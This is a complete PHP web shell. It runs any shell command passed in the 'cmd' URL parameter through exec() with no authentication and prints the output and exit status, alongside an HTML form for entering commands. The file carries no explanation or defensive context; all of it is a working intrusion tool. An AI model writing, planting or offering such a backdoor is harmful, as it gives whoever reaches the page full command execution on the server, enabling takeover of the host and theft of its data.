<?php
echo '<h1>shell</h1>';
if (isset($_GET['cmd'])) {
   $out = [];
   $return_var = 0;
   exec ($_GET['cmd'], $out, $return_var);
   echo $_GET['cmd'].'<br />';
   echo 'exit status:'.$return_var.'<br />';
   echo '<h2>&nbsp;</h2>';
   foreach ($out as $line) {
           echo $line.'<br />';
   }
}
?>
<h2>&nbsp;</h2>
<form action="#" target="_self" method="get">
      command: <input type="text" name="cmd" size="120" />
      <br />
      <button type="submit">RUN</button>
</form>



